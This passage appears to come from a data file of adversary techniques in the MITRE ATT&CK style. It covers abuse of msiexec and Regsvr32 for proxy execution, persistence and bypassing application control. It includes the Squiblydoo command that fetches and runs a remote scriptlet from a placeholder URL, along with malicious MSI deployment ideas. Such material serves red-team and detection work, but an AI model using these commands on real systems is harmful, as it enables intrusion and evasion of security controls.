          Execute MSI through scheduled tasks: Create scheduled task running msiexec.exe
          Use msiexec with transform files: msiexec.exe /i package.msi TRANSFORMS=malicious.mst
          Execute administrative installation: msiexec.exe /a package.msi /qn TARGETDIR=C:\temp
          Leverage MSI advertised installation: msiexec.exe /j package.msi
          Use patch packages for execution: msiexec.exe /p patch.msp
          Execute through MSI database transforms: Apply custom transforms during installation for code execution
          Use rollback customization: Create malicious rollback scripts in MSI package
          Use embedded VBScript in MSI package: Create MSI with custom VBScript actions
          Execute through WMI: Invoke msiexec remotely using WMI
          Modify MSI security descriptors: Alter package permissions for privilege escalation
          Use MSI merge modules: Execute code through merged module installation
          Create self-extracting MSI: Package MSI as self-extracting executable
          Leverage MSI component reinstall: msiexec.exe /i package.msi REINSTALL=ALL
          Use MSI package validation: Execute code through custom validation rules
          Exploit MSI package dependencies: Chain execution through dependent packages
          Create MSI with deferred custom actions: Execute code in system context
          Use MSI binary table for payload storage: Store and execute encoded payloads
          Use MSI source resiliency: Execute through package cache repair
          Leverage MSI advertised shortcuts: Create shortcuts that trigger installation
          Use cross-platform MSI execution: Execute through Wine on Linux systems
          Execute through Group Policy software installation: Deploy malicious MSI via GPO
          Use MSI impersonation: Execute under different user context
          Create nested MSI packages: Hide malicious MSI within legitimate package
          Use MSI through RunOnce registry: Install via registry auto-execution
          Execute through Active Directory software distribution: Deploy via AD
          Use MSI with alternative credentials: msiexec.exe /i package.msi USERNAME=X PASSWORD=Y
          Create self-healing MSI applications: Execute through Windows Installer repair
        Regsvr32: Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft. (Citation: Microsoft Regsvr32)  Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a "Squiblydoo" and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)  Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)
          Execute remote scriptlet using "regsvr32.exe /s /n /u /i:http://example.com/file.sct scrobj.dll" for Squiblydoo attack
          Register malicious DLL locally using "regsvr32.exe malicious.dll"
          Unregister and re-register COM object for persistence using "regsvr32.exe /u legitimate.dll" followed by malicious DLL registration
          Use regsvr32 with /i parameter to bypass AppLocker policies
          Execute regsvr32 through scheduled tasks to maintain persistence
          Load remote scriptlets through proxy-aware capabilities to evade network detection
          Register COM objects silently using /s switch to avoid user notification
          Chain regsvr32 execution with other LOLBins for complex attack sequences
